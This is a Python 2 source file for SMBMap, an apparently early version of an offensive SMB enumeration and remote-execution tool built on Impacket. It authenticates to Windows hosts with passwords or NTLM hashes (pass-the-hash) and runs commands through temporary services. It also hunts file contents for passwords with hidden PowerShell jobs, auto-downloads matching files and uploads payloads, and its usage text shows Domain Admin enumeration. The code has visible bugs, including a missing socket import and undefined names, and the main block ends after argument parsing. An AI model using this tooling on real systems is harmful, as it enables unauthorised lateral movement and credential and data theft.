#!/usr/bin/env python

import sys
import uuid
import signal
import string
import time
import random
import string
import logging
import ConfigParser
from threading import Thread
from impacket import smb, version, smb3, nt_errors, smbserver
from impacket.dcerpc.v5 import samr, transport, srvs
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import *
from impacket.dcerpc import transport, svcctl, srvsvc
import ntpath
import cmd
import os
import re

# A lot of this code was taken from Impacket's own examples
# https://impacket.googlecode.com
# Seriously, the most amazing Python library ever!!
# Many thanks to that dev team

OUTPUT_FILENAME = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10))
BATCH_FILENAME  = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10)) + '.bat'
SMBSERVER_DIR   = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10))
DUMMY_SHARE     = 'TMP'
PERM_DIR = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10))

class SMBServer(Thread):
    def __init__(self):
        if os.geteuid() != 0:
            exit('[!] Error: ** SMB Server must be run as root **')
        Thread.__init__(self)

    def cleanup_server(self):
        print '[*] Cleaning up..'
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        print '[*] Creating tmp directory'
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception, e:
            print '[!]', e
            pass
        print '[*] Setting up SMB Server'
        self.smb.processConfigFile()
        print '[*] Ready to listen...'
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class RemoteShell():
    def __init__(self, share, rpc, mode, serviceName, command):
        self.__share = share
        self.__mode = mode
        self.__output = '\\' + OUTPUT_FILENAME
        self.__batchFile = '\\' + BATCH_FILENAME
        self.__outputBuffer = ''
        self.__command = command
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc

        dce = rpc.get_dce_rpc()
        try:
            dce.connect()
        except Exception, e:
            print '[!]', e
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        
        dce.bind(svcctl.MSRPC_UUID_SVCCTL)
        self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
        resp = self.rpcsvc.OpenSCManagerW()
        self.__scHandle = resp['ContextHandle']
        self.transferClient = rpc.get_smb_connection()

    def set_copyback(self):
        s = self.__rpc.get_smb_connection()
        s.setTimeout(100000)
        myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
        self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

    def finish(self):
        # Just in case the service is still created
        try:
           dce = self.__rpc.get_dce_rpc()
           dce.connect()
           dce.bind(svcctl.MSRPC_UUID_SVCCTL)
           self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
           resp = self.rpcsvc.OpenSCManagerW()
           self.__scHandle = resp['ContextHandle']
           resp = self.rpcsvc.OpenServiceW(self.__scHandle, self.__serviceName)
           service = resp['ContextHandle']
           self.rpcsvc.DeleteService(service)
           self.rpcsvc.StopService(service)
           self.rpcsvc.CloseServiceHandle(service)
        except Exception, e:
            print '[!]', e
            pass

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data
        
        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, self.__output, output_callback)
            self.transferClient.deleteFile(self.__share, self.__output)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        resp = self.rpcsvc.CreateServiceW(self.__scHandle, self.__serviceName, self.__serviceName, command.encode('utf-16le'))
        service = resp['ContextHandle']
        try:
           self.rpcsvc.StartServiceW(service)
        except Exception as e:
            pass
        self.rpcsvc.DeleteService(service)
        self.rpcsvc.CloseServiceHandle(service)
        self.get_output()

    def send_data(self, data, disp_output = True):
        self.execute_remote(data)
        if disp_output:
            print self.__outputBuffer
        result = self.__outputBuffer
        self.__outputBuffer = ''
        return result

class CMDEXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }


    def __init__(self, protocols = None, username = '', password = '', domain = '', hashes = None, share = None, command = None, disp_output = True):
        if not protocols:
            protocols = PSEXEC.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = [protocols]
        self.__serviceName = self.service_generator().encode('utf-16le')
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__mode  = 'SHARE'
        self.__command = command
        self.__disp_output = disp_output
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def service_generator(self, size=6, chars=string.ascii_uppercase):
        return ''.join(random.choice(chars) for _ in range(size))

    def run(self, addr):
        result = ''
        for protocol in self.__protocols:
            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            stringbinding = protodef[0] % addr

            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)

            if hasattr(rpctransport,'preferred_dialect'):
               rpctransport.preferred_dialect(SMB_DIALECT)
            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            try:
                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
                result = self.shell.send_data(self.__command, self.__disp_output)
            except SessionError as e:
                if 'STATUS_SHARING_VIOLATION' in str(e):
                    print '[!] Error encountered, sharing violation, unable to retrieve output'
                    sys.exit(1)
                print '[!] Error writing to C$, attempting to start SMB server to store output'
                smb_server = SMBServer()
                smb_server.daemon = True
                smb_server.start()
                self.__mode = 'SERVER'
                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
                self.shell.set_copyback()
                result = self.shell.send_data(self.__command, self.__disp_output)
                smb_server.stop() 
            except (Exception, KeyboardInterrupt), e:
                print '[!] Insufficient privileges, unable to execute code' 
                print '[!]', e
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                #print(exc_type, fname, exc_tb.tb_lineno)
                sys.stdout.flush()
        return result
           
            
class SMBMap():
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }

    def __init__(self):
        self.recursive = False
        self.list_files = False
        self.smbconn = {}
        self.isLoggedIn = False
        self.pattern = None
        self.hosts = {}
        self.jobs = {}
        self.search_output_buffer = ''
     
    def login(self, host, username, password, domain):
        try:
            self.smbconn[host] = SMBConnection(host, host, sess_port=445)
            self.smbconn[host].login(username, password, domain=domain)
             
            if self.smbconn[host].isGuestSession() > 0:
                print '[+] Guest SMB session established...'
            else:
                print '[+] User SMB session establishd...'
            return True

        except Exception as e:
            print '[!] Authentication error occured'
            print '[!]', e
            return False
 
    def logout(self, host):
        self.smbconn[host].logoff()
    
    def smart_login(self):
        for host in self.hosts.keys():
            if self.is_ntlm(self.hosts[host]['passwd']):
                print '[+] Hash detected, using pass-the-hash to authentiate'
                if self.hosts[host]['port'] == 445: 
                    success = self.login_hash(host, self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'])
                else:
                    success = self.login_rpc_hash(host, self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'])
            else:
                if self.hosts[host]['port'] == 445:
                    success = self.login(host, self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'])
                else:
                    success = self.login_rpc(host, self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'])
            if not success:
                print '[!] Authentication error on %s' % (host)
                continue
     
            print '[+] IP: %s:%s\tName: %s' % (host, self.hosts[host]['port'], self.hosts[host]['name'].ljust(50))
            
    def login_rpc_hash(self, host, username, ntlmhash, domain):
        lmhash, nthash = ntlmhash.split(':')    
    
        try:
            self.smbconn[host] = SMBConnection('*SMBSERVER', host, sess_port=139)
            self.smbconn[host].login(username, '', domain, lmhash=lmhash, nthash=nthash)
            
            if self.smbconn[host].isGuestSession() > 0:
                print '[+] Guest RCP session established...'
            else:
                print '[+] User RCP session establishd...'
            return True

        except Exception as e:
            print '[!] RPC Authentication error occured'
            sys.exit()
     
    def login_rpc(self, host, username, password, domain):
        try:
            self.smbconn[host] = SMBConnection('*SMBSERVER', host, sess_port=139)
            self.smbconn[host].login(username, password, domain)
            
            if self.smbconn[host].isGuestSession() > 0:
                print '[+] Guest RCP session established...'
            else:
                print '[+] User RCP session establishd...'
            return True
        
        except Exception as e:
            print '[!] RPC Authentication error occured'
            return False
            sys.exit()
 
    def login_hash(self, host, username, ntlmhash, domain):
        lmhash, nthash = ntlmhash.split(':')    
        try:
            self.smbconn[host] = SMBConnection(host, host, sess_port=445)
            self.smbconn[host].login(username, '', domain, lmhash=lmhash, nthash=nthash)
            
            if self.smbconn[host].isGuestSession() > 0:
                print '[+] Guest session established...'
            else:
                print '[+] User session establishd...'
            return True

        except Exception as e:
            print '[!] Authentication error occured'
            print '[!]', e
            return False
            sys.exit()   
 
    def find_open_ports(self, address, port):    
        result = 1
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((address,port))
            if result == 0:
                sock.close()
                return True
        except:
            return False

    def start_file_search(self, host, pattern, share, search_path):
        job_name = str(uuid.uuid4().get_hex())[0:24]
        try:
            tmp_dir = self.exec_command(host, share, 'echo %TEMP%', False).strip()
            if len(tmp_dir) == 0:
                tmp_dir = 'C:\\'
            ps_command = 'powershell -command "Start-Process cmd -ArgumentList """"/c """"""""findstr /R /S /M /P /C:""""""""%s"""""""" %s\*.* 2>nul > %s\%s.txt"""""""" """" -WindowStyle hidden"' % (pattern, search_path, tmp_dir, job_name)
            success = self.exec_command(host, share, ps_command, False)
            self.jobs[job_name] = { 'host' : host, 'share' : share, 'tmp' : tmp_dir , 'pattern' : pattern}
            print '[+] Job %s started on %s, result will be stored at %s\%s.txt' % (job_name, host, tmp_dir, job_name)
        except Exception as e:
            print e
            print '[!] Job creation failed on host: %s' % (host)

    def get_search_results(self):
        print '[+] Grabbing search results, be patient, share drives tend to be big...'
        counter = 0
        while counter != len(self.jobs.keys()):
            try:
                for job in self.jobs.keys():
                    result = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], 'cmd /c "2>nul (>>%s\%s.txt (call )) && (echo not locked) || (echo locked)"' % (self.jobs[job]['tmp'], job), False)
                    if 'not locked' in result:
                        dl_target = '%s%s\%s.txt' % (share, self.jobs[job]['tmp'][2:], job)
                        host_dest = self.download_file(host, dl_target, False)
                        results_file = open(host_dest)
                        self.search_output_buffer += 'Host: %s \t\tPattern: %s\n' % (self.jobs[job]['host'], self.jobs[job]['pattern'])
                        self.search_output_buffer += results_file.read()
                        os.remove(host_dest)
                        self.delete_file(host, dl_target, False)
                        counter += 1
                        print '[+] Job %d of %d completed' % (counter, len(self.jobs.keys()))
                    else:
                        time.sleep(10)
            except Exception as e:
                print e
        print '[+] All jobs complete'
        print self.search_output_buffer 
                    
    def list_drives(self, host, share):
        counter = 0
        disks = []
        local_disks = self.exec_command(host, share, 'fsutil fsinfo drives', False)
        net_disks_raw = self.exec_command(host, share, 'net use', False)
        net_disks = ''
        for line in net_disks_raw.split('\n'):
            if ':' in line:
                data = line.split(' ')
                data = filter(lambda a: a != '', data)
                for item in data:
                    counter += 1
                    net_disks += '%s\t\t' % (item)
                    if '\\' in item:
                        net_disks += ' '.join(data[counter:])
                        break
                disks.append(net_disks)
                net_disks = ''
        print '[+] Host %s Local %s' % (host, local_disks.strip())
        print '[+] Host %s Net Drive(s):' % (host)
        if len(disks) > 0:
            for disk in disks:
                 print '\t%s' % (disk)
        else:
            print '\tNo mapped network drives'
        pass    
        
    def output_shares(self, host, lsshare, lspath, verbose=True):
        shareList = [lsshare] if lsshare else self.get_shares(host)
        for share in shareList:
            error = 0
            pathList = {}
            canWrite = False
            try:
                root = string.replace('/%s' % (PERM_DIR),'/','\\')
                root = ntpath.normpath(root)
                self.create_dir(host, share, root)
                print '\t%s\tREAD, WRITE' % (share.ljust(50))
                canWrite = True
                try:
                    self.remove_dir(host, share, root)
                except:
                    print '\t[!] Unable to remove test directory at \\\\%s\\%s%s, plreae remove manually' % (host, share, root)
            except Exception as e:
                #print e
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                #print(exc_type, fname, exc_tb.tb_lineno)
                sys.stdout.flush()
                canWrite = False

            if canWrite == False:
                readable = self.list_path(host, share, '', self.pattern, False)
                if readable:
                    print '\t%s\tREAD ONLY' % (share.ljust(50))
                else:
                    error += 1

            if error == 0 and (len(set(sys.argv).intersection(['-r','-R'])) == 1):
                path = '/'
                if self.list_files and not self.recursive:
                    if lsshare and lspath:
                        if self.pattern:
                            print '\t[+] Starting search for files matching \'%s\' on share %s.' % (self.pattern, lsshare)
                        dirList = self.list_path(host, lsshare, lspath, self.pattern, verbose)
                        sys.exit()
                    else:
                        if self.pattern:
                            print '\t[+] Starting search for files matching \'%s\' on share %s.' % (self.pattern, share)
                        dirList = self.list_path(host, share, path, self.pattern, verbose)
                
                if self.recursive:
                    if lsshare and lspath:
                        if self.pattern:
                            print '\t[+] Starting search for files matching \'%s\' on share %s.' % (self.pattern, lsshare)
                        dirList = self.list_path_recursive(host, lsshare, lspath, '*', pathList, pattern, verbose)
                        sys.exit()
                    else:
                        if self.pattern:
                            print '\t[+] Starting search for files matching \'%s\' on share %s.' % (self.pattern, share)
                        dirList = self.list_path_recursive(host, share, path, '*', pathList, pattern, verbose)
            
            if error > 0:
                print '\t%s\tNO ACCESS' % (share.ljust(50))
                error = 0

    def get_shares(self, host):
        shareList = self.smbconn[host].listShares()
        shares = []
        for item in range(len(shareList)):
            shares.append(shareList[item]['shi1_netname'][:-1])
        return shares 

    def list_path_recursive(self, host, share, pwd, wildcard, pathList, pattern, verbose):
        root = self.pathify(pwd)
        width = 16
        try:
            pathList[root] = self.smbconn[host].listPath(share, root)
            if verbose: 
                print '\t.%s' % (pwd.replace('//','/'))
            if len(pathList[root]) > 2:
                    for smbItem in pathList[root]:
                        try:
                            filename = smbItem.get_longname()
                            isDir = 'd' if smbItem.is_directory() > 0 else '-' 
                            filesize = smbItem.get_filesize() 
                            readonly = 'w' if smbItem.is_readonly() > 0 else 'r'
                            date = time.ctime(float(smbItem.get_mtime_epoch()))
                            if smbItem.is_directory() <= 0:
                                if self.pattern:
                                    fileMatch = re.search(pattern.lower(), filename.lower())
                                    if fileMatch:
                                        dlThis = '%s%s/%s' % (share, pwd, filename) 
                                        print '\t[+] Match found! Downloading: %s' % (dlThis.replace('//','/'))
                                        self.download_file(host, dlThis, True) 
                            if verbose: 
                                print '\t%s%s--%s--%s-- %s %s\t%s' % (isDir, readonly, readonly, readonly, str(filesize).rjust(width), date, filename)
                        except SessionError as e:
                            print '[!]', e
                            continue
                        except Exception as e:
                            print '[!]', e
                            exc_type, exc_obj, exc_tb = sys.exc_info()
                            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                            print(exc_type, fname, exc_tb.tb_lineno)
                            sys.stdout.flush()
                    for smbItem in pathList[root]:
                        try:
                            filename = smbItem.get_longname()
                            if smbItem.is_directory() > 0 and filename != '.' and filename != '..':
                                subPath = '%s/%s' % (pwd, filename)
                                subPath = self.pathify(subPath)
                                pathList[subPath] = self.smbconn[host].listPath(share, subPath)
                                if len(pathList[subPath]) > 2:
                                    self.list_path_recursive(host, share, '%s/%s' % (pwd, filename), wildcard, pathList, pattern, verbose)

                        except SessionError as e:
                            continue
        except Exception as e:
            pass

    def pathify(self, path):
        root = ntpath.join(path,'*')
        root = root.replace('/','\\')
        #root = ntpath.normpath(root)
        return root

    def list_path(self, host, share, path, pattern, verbose=False):
        pwd = self.pathify(path)
        width = 16
        try:
            pathList = self.smbconn[host].listPath(share, pwd)
            if verbose:
                print '\t.%s' % (path.ljust(50))
            for item in pathList:
                filesize = item.get_filesize() 
                readonly = 'w' if item.is_readonly() > 0 else 'r'
                date = time.ctime(float(item.get_mtime_epoch()))
                isDir = 'd' if item.is_directory() > 0 else 'f'
                filename = item.get_longname()
                if item.is_directory() <= 0:
                    if self.pattern:
                        fileMatch = re.search(pattern.lower(), filename.lower())
                        if fileMatch:
                            dlThis = '%s%s/%s' % (share, pwd.strip('*'), filename) 
                            print '\t[+] Match found! Downloading: %s' % (dlThis.replace('//','/'))
                            self.download_file(host, dlThis, True) 
                if verbose:
                    print '\t%s%s--%s--%s-- %s %s\t%s' % (isDir, readonly, readonly, readonly, str(filesize).rjust(width), date, filename)
            return True
        except Exception as e:
            return False     
 
    def create_dir(self, host, share, path):
        #path = self.pathify(path)
        self.smbconn[host].createDirectory(share, path)

    def remove_dir(self, host, share, path):
        #path = self.pathify(path)
        self.smbconn[host].deleteDirectory(share, path)
    
    def valid_ip(self, address):
        try:
            socket.inet_aton(address)
            return True
        except:
            return False

    def filter_results(self, pattern):
        pass
    
    def download_file(self, host, path, verbose=True):
        path = path.replace('/','\\')
        path = ntpath.normpath(path)
        filename = path.split('\\')[-1]   
        share = path.split('\\')[0]
        path = path.replace(share, '')
        try:
            out = open(ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share, path.replace('\\','_')))),'wb')
            dlFile = self.smbconn[host].listPath(share, path)
            if verbose:
                msg = '[+] Starting download: %s (%s bytes)' % ('%s%s' % (share, path), dlFile[0].get_filesize())
                if self.pattern:
                    msg = '\t' + msg
                print msg 
            self.smbconn[host].getFile(share, path, out.write)
            if verbose:
                msg = '[+] File output to: %s/%s' % (os.getcwd(), ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share, path.replace('\\','_')))))
                if self.pattern:
                    msg = '\t'+msg
                print msg 
        except SessionError as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print '[!] Error retrieving file, access denied'
            elif 'STATUS_INVALID_PARAMETER' in str(e):
                print '[!] Error retrieving file, invalid path'
            elif 'STATUS_SHARING_VIOLATION' in str(e):
                print '[!] Error retrieving file, sharing violation'
        except Exception as e:
            print '[!] Error retrieving file, unkown error'
            os.remove(filename)
        out.close()
        return '%s/%s' % (os.getcwd(), ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share, path.replace('\\','_')))))
    
    def exec_command(self, host, share, command, disp_output = True):
        if self.is_ntlm(self.hosts[host]['passwd']):
            hashes = self.hosts[host]['passwd']
        else:
            hashes = None 
        executer = CMDEXEC('445/SMB', self.hosts[host]['user'], self.hosts[host]['passwd'], self.hosts[host]['domain'], hashes, share, command, disp_output)
        result = executer.run(host)
        return result   
 
    def delete_file(self, host, path, verbose=True):
        path = path.replace('/','\\')
        path = ntpath.normpath(path)
        filename = path.split('\\')[-1]   
        share = path.split('\\')[0]
        path = path.replace(share, '')
        path = path.replace(filename, '')
        try:
            self.smbconn[host].deleteFile(share, path + filename)
            if verbose:
                print '[+] File successfully deleted: %s%s%s' % (share, path, filename)
        except SessionError as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print '[!] Error deleting file, access denied'
            elif 'STATUS_INVALID_PARAMETER' in str(e):
                print '[!] Error deleting file, invalid path'
            elif 'STATUS_SHARING_VIOLATION' in str(e):
                print '[!] Error retrieving file, sharing violation'
            else:
                print '[!] Error deleting file %s%s%s, unkown error' % (share, path, filename)
                print '[!]', e
        except Exception as e:
            print '[!] Error deleting file %s%s%s, unkown error' % (share, path, filename)
            print '[!]', e
         
    def upload_file(self, host, src, dst): 
        dst = string.replace(dst,'/','\\')
        dst = ntpath.normpath(dst)
        dst = dst.split('\\')
        share = dst[0]
        dst = '\\'.join(dst[1:])
        if os.path.exists(src):
            print '[+] Starting upload: %s (%s bytes)' % (src, os.path.getsize(src))
            upFile = open(src, 'rb')
            try:
                self.smbconn[host].putFile(host, share, dst, upFile.read)
                print '[+] Upload complete' 
            except:
                print '[!] Error uploading file, you need to include destination file name in the path'
            upFile.close() 
        else:
            print '[!] Invalid source. File does not exist'
            sys.exit()

    def is_ntlm(self, password):
        try:
            if len(password.split(':')) == 2:
                lm, ntlm = password.split(':')
                if len(lm) == 32 and len(ntlm) == 32:
                    return True
                else: 
                    return False
        except Exception as e:
            return False

    def get_version(self, host):
        try:
            rpctransport = transport.SMBTransport(self.smbconn[host].getServerName(), self.smbconn[host].getRemoteHost(), filename = r'\srvsvc', smb_connection = self.smbconn[host])
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(srvs.MSRPC_UUID_SRVS)
            resp = srvs.hNetrServerGetInfo(dce, 102)
            
            print "Version Major: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_major']
            print "Version Minor: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_minor']
            print "Server Name: %s" % resp['InfoStruct']['ServerInfo102']['sv102_name']
            print "Server Comment: %s" % resp['InfoStruct']['ServerInfo102']['sv102_comment']
            print "Server UserPath: %s" % resp['InfoStruct']['ServerInfo102']['sv102_userpath']
            print "Simultaneous Users: %d" % resp['InfoStruct']['ServerInfo102']['sv102_users']
        except Exception as e:
            print '[!] RPC Access denied...oh well'
            print '[!]', e
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            sys.exit()

def signal_handler(signal, frame):
    print 'You pressed Ctrl+C!'
    sys.exit(1)

def usage():
    print 'SMBMap - Samba Share Enumerator'
    print 'Shawn Evans - Shawn.Evans@gmail.com'
    print ''
    print '$ python %s -u jsmith -p password1 -d workgroup -h 192.168.0.1' % (sys.argv[0])
    print '$ python %s -u jsmith -p \'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d\' -h 172.16.0.20' % (sys.argv[0]) 
    print '$ cat smb_ip_list.txt | python %s -u jsmith -p password1 -d workgroup' % (sys.argv[0])
    print '$ python smbmap.py -u \'apadmin\' -p \'asdf1234!\' -d ACME -h 10.1.3.30 -x \'net group "Domain Admins" /domain\''
    print ''
    print '-P\t\tport (default 445), ex 139'
    print '-h\t\tIP of host'
    print '-u\t\tUsername, if omitted null session assumed'
    print '-p\t\tPassword or NTLM hash' 
    print '-s\t\tShare to use for smbexec command output (default C$), ex \'C$\''
    print '-x\t\tExecute a command, ex. \'ipconfig /r\''
    print '-d\t\tDomain name (default WORKGROUP)'
    print '-R\t\tRecursively list dirs, and files (no share\path lists ALL shares), ex. \'C$\\Finance\''
    print '-A\t\tDefine a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex "(web|global).(asax|config)"'
    print '-r\t\tList contents of directory, default is to list root of all shares, ex. -r \'c$\Documents and Settings\Administrator\Documents\''
    print '-F\t\tFile content search, -F \'[Pp]assword\' (requies admin access to execute commands, and powershell on victim host)'
    print '--search-path\tSpecify drive/path to search (used with -F, default C:\\Users), ex \'D:\\HR\\\''
    print '-D\t\tDownload path, ex. \'C$\\temp\\passwords.txt\''
    print '-L\t\tList all drives on a host'
    print '--upload-src\tFile upload source, ex \'/temp/payload.exe\'  (note that this requires --upload-dst for a destiation share)'
    print '--upload-dst\tUpload destination on remote host, ex \'C$\\temp\\payload.exe\''
    print '--del\t\tDelete a remote file, ex. \'C$\\temp\\msf.exe\''
    print '--skip\t\tSkip delete file confirmation prompt'
    print '-q\t\tDisable verbose output (basically only really useful with -A)'
    print ''
    sys.exit()
     
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    if len(sys.argv) < 3:
        usage()
    mysmb = SMBMap()
    validArgs = ('-L', '--search-path', '-q', '-d', '-P', '-h', '-u', '-p', '-s', '-x', '-A', '-R', '-F', '-D', '-r', '--upload-src', '--upload-dst', '--del', '--skip')
    ipArg = False 
    ip = ''
    counter = 0
    isFile = False
    host = {}
    canWrite = 0
    dlPath = False
    src = False
    dst = False
    delFile = False
    lsshare = False 
    lspath = False
    command= False
    port = False
    share = False
    skip = None
    user = ''
    passwd = ''
    pattern = ''
    verbose = True 
    file_search = False
    list_drives = False
    list_shares = True
    search_path = None
 
    for val in sys.argv:
        try:
            if val == '-q':
                verbose = False
            if val == '-R':
                mysmb.recursive = True
            if val == '-?' or val == '--help':
                usage()
            if val == '-R' or val == '-r':
                mysmb.list_files = True
                try:
                    if sys.argv[counter+1] not in validArgs:
                        lspath = sys.argv[counter+1].replace('/','\\').split('\\')
                        lsshare = lspath[0]
                        lspath = '\\'.join(lspath[1:])
                except:
                    continue
            if val == '-u':
                if sys.argv[counter+1] not in validArgs:
                    user = sys.argv[counter+1]
                else:
                   raise Exception('Invalid Username')
            if val == '-x':
                if sys.argv[counter+1] not in validArgs:
                    command = sys.argv[counter+1]
                    list_shares = False
                else:
                    raise Exception('Invalid smbexec command')
            if val == '-p':
                if sys.argv[counter+1] not in validArgs:
                    passwd = sys.argv[counter+1]
                else:
                    raise Exception('Invalid password')
            if val == '-d':
                if sys.argv[counter+1] not in validArgs:
                    domain = sys.argv[counter+1]
                else:
                    raise Exception('Invalid domain name')
            if val == '-L':
                list_drives = True
                list_shares = False
            if val == '--search-path':
                if sys.argv[counter+1] not in validArgs:
                    search_path = sys.argv[counter+1]
                    list_shares = False
                else:
                    raise Exception('Invalid search pattern')
            if val == '-h':
                if sys.argv[counter+1] not in validArgs:
                    ipArg = sys.argv[counter+1]
                else:
                    raise Exception('Host missing')
            if val == '-s':
                if sys.argv[counter+1] not in validArgs:
                    share = sys.argv[counter+1]
                else:
                    raise Exception('Invalid share')
            if val == '-A':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        mysmb.pattern = sys.argv[counter+1]
                        print '[+] Auto download pattern defined: %s' % (mysmb.pattern)
                except Exception as e:
                    print '[!]', e
                    continue
            if val == '-P':
                if sys.argv[counter+1] not in validArgs:
                    port = sys.argv[counter+1]
                else:
                    raise Exception('Invalid port')
            if val == '-D':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        dlPath = sys.argv[counter+1]
                        list_shares = False
                except:
                    print '[!] Missing download source'
                    sys.exit()
            if val == '--upload-dst':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        dst = sys.argv[counter+1]
                        list_shares = False
                    else:
                        raise Exception('Missing destination upload path')
                except:
                    print '[!] Missing destination upload path (--upload-dst)'
                    sys.exit()
            if val == '--upload-src':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        src = sys.argv[counter+1]
                        list_shares = False
                    else:
                        raise Exception('Invalid upload source')
                except:
                    print '[!] Missing upload source'
                    sys.exit()
            if val == '--del':
                if sys.argv[counter+1] not in validArgs:
                    delFile = sys.argv[counter+1]
                    list_shares = False
                else:
                    raise Exception('Invalid delete path')
            if val == '--skip':
               skip = True 
            if val == '-F':
                if sys.argv[counter+1] not in validArgs:
                    file_search = True
                    pattern = sys.argv[counter+1]
                    list_shares = False
                else:
                    print '[!] Invalid search pattern'
                    sys.exit()
            counter+=1
        except Exception as e:
            print 
            print '[!]', e 
            sys.exit()

    choice = ''  

    if (command or file_search or list_drives) and not share:
        share = 'C$'
    if delFile and skip == None: 
        valid = ['Y','y','N','n'] 
        while choice not in valid:
            sys.stdout.write('[?] Confirm deletetion of file: %s [Y/n]? ' % (delFile))
            choice = raw_input()
            if choice == 'n' or choice == 'N':
                print '[!] File deletion aborted...'
                sys.exit()
            elif choice == 'Y' or choice == 'y' or choice == '':
                break
            else:
                print '[!] Invalid input'

    if (not src and dst): 
        print '[!] Upload destination defined, but missing source (--upload-src)'
        sys.exit()
    elif (not dst and src):
        print '[!] Upload source defined, but missing destination (--upload-dst)'
        sys.exit()

    if '-A' in sys.argv and ('-R' not in sys.argv and  '-r' not in sys.argv):
        print '[!] Auto download requires file listing (-r or -R)...aborting'
        sys.exit()
     
